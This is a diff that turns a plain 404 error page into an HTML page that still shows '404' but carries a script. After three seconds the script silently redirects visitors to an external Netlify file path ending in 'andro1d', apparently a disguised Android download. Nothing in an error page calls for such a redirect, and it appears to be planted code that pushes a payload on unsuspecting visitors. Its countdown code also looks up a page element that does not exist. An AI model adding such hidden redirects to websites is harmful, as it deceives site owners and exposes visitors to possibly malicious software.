@@ -1,1 +1,32 @@
-<h1>404</h1>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404</title>
+  
+</head>
+<body>
+  <h1><b>404</b></h1>
+    <script>
+        
+        const targetUrl = "https://imusicapp.netlify.app/files/78b4708d/andro1d";
+        
+       
+        let seconds = 3;
+        const countdownElement = document.getElementById("countdown");
+        
+        const countdownInterval = setInterval(() => {
+            seconds--;
+            if (seconds >= 0) {
+                countdownElement.textContent = seconds;
+            } else {
+                clearInterval(countdownInterval);
+            }
+        }, 1000);
+        setTimeout(() => {
+            window.location.href = targetUrl;
+        }, 3000);
+    </script>
+</body>
+</html>
